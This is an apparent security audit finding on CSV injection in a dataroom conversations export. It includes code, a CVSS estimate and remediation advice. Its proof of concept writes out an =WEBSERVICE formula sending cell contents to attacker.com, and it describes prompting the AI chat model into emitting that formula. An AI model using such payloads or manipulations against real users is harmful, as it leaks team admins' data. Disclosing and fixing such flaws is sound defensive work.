# Finding: CSV Injection in Team-Conversations Q&A Export

## Severity
MEDIUM

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.0 (attacker plants formula in a dataroom visitor's question → AI-generated answer is stored verbatim → team admin exports the Q&A → formula fires).

## Affected Code
- File: `ee/features/conversations/api/team-conversations-route.ts`
- Line: 778 (`const csvContent = rows.join("\n")`) — `rows` were built via `csvRow([...])` (line 763-774)
- Function: anonymous route handler for the conversations export endpoint
- Endpoint: `GET /api/teams/:teamId/conversations/export` (or similar — verify the exact route)

## Description
The export is triggered by a logged-in team member; rows include visitor Q&A. Visitor questions are user input (the entire chat is meant to be untrusted). The handler writes `Q: ${item.editedQuestion}\nA: ${item.answer}` (line 771) as a single CSV cell — if either field contains `"`, `,`, or `\n`, the column count is desynchronised for every subsequent row. There is no leading-character guard either.

The `csvRow` function (line ~712, not shown in this excerpt) does a plain `.join(",")` with no escaping. **The AI-generated answer is stored verbatim in the CSV cell**, so an attacker can plant a payload by:
1. Submitting a question that elicits an answer starting with `=WEBSERVICE(...)` (the AI is a model and may produce arbitrary output including formula prefixes)
2. The team admin exports the Q&A
3. The team admin opens the CSV in Excel
4. The formula fires

## Proof of Concept

### Pre-conditions
- The dataroom has the AI chat feature enabled.
- A dataroom visitor (or an attacker with a link) submits a question that elicits an answer starting with `=WEBSERVICE(...)`.

### Step-by-step exploitation
1. Attacker (a dataroom visitor) submits a question to the dataroom's AI chat that elicits an answer starting with `=WEBSERVICE("https://attacker.com/?c="&A1)`. The AI model produces the formula as its response (the model is meant to be helpful, so prompts that request "start your answer with a hyperlink formula" or "format your answer as an Excel formula" will elicit the payload).
2. The answer is stored in `item.answer` (model-generated, stored verbatim).
3. The team admin triggers the conversations export.
4. The handler writes `Q: <question>\nA: =WEBSERVICE(...)` as a single CSV cell.
5. The team admin opens the CSV in Excel.
6. The cell fires the formula; the attacker receives the spreadsheet contents.

## Impact
- **Spreadsheet exfiltration** — the attacker receives the contents of the CSV cells, which may include other visitor questions, document names, and team admin emails.
- **Phishing pivot** — the cell becomes a clickable link to attacker-controlled content.
- **DDE / command execution** on older Excel versions.

## Evidence
```ts
// ee/features/conversations/api/team-conversations-route.ts:763-786
for (const item of faqItems) {
  rows.push(
    csvRow([
      item.sourceConversationId ?? "",
      "Published FAQ",
      item.title ?? "",
      item.dataroomDocument?.document.name ?? "",
      item.visibilityMode,
      "",
      "",
      `Q: ${item.editedQuestion}\nA: ${item.answer}`,  // ← multi-line, multi-source
      item.createdAt.toISOString(),
      item.createdAt.toISOString(),
    ]),
  );
}
const csvContent = rows.join("\n");
```
Where `csvRow` does a plain `.join(",")` with no escaping.

## Methodology
- **M2 — Encoding analysis** (`methodology-raw/01-encoding-analysis.md` Finding 3)

## Chain Potential
- **Chain 8** (`methodology-raw/05-chains.md`) — the conversations export is one leg of the CSV injection chain. The other legs are F-017 (client-side downloadCSV), F-021 (dataroom index), and the welcomeMessage / Agreement.name write paths (F-024/F-025).

## Remediation
Run every cell through a shared `escapeCsvField` helper (see F-017 for the implementation). Move that helper into `lib/utils/csv.ts` so all three sites share it. The exported file is downloaded and opened in Excel by team admins — they are exactly the high-value targets for a CSV-injection phishing payload.

Additionally, **strip leading formula prefixes from AI-generated answers** at the write path: if `item.answer.startsWith("=") || item.answer.startsWith("+") || item.answer.startsWith("-") || item.answer.startsWith("@")`, prepend a space or wrap in a code block. The same applies to the `editedQuestion` field if it's user-controlled.
